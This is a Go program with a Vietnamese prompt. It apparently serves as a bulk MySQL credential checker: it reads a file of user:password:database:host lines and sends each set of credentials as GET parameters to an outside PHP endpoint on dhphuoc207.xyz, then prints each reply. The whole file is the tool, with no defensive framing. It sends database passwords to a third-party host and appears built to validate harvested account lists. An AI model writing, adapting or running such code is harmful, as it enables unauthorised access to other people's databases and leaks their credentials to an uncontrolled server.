package main
import (
	"bufio"
	"fmt"
	"log"
	"net/http"
	"os"
	"strings"
	"io"
)
func main() {
	var filename string
	fmt.Println("nhập file chứa list account mysql: ")
	_, err := fmt.Scan(&filename)
	if err != nil {
		log.Fatal("Error: ", err)
	}
	file, err := os.Open(filename)
	if err != nil {
		log.Fatal("Error: ", err)
	}
	defer file.Close()
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		parts := strings.Split(line, ":")
		if len(parts) < 4 {
			continue
		}
		tk := parts[0]
		mk := parts[1]
		dtbs := parts[2]
		host := parts[3]
		client := &http.Client{}
		req, err := http.NewRequest("GET", "https://dhphuoc207.xyz/zcanmysql.php?host="+host+"&username="+tk+"&password="+mk+"&database="+dtbs, nil)
		if err != nil {
			log.Fatal(err)
		}
		resp, err := client.Do(req)
		if err != nil {
			log.Fatal(err)
		}
		defer resp.Body.Close()
		bodyText, err := io.ReadAll(resp.Body)
		if err != nil {
			log.Fatal(err)
		}
		fmt.Printf("%s\n", bodyText)
	}
}
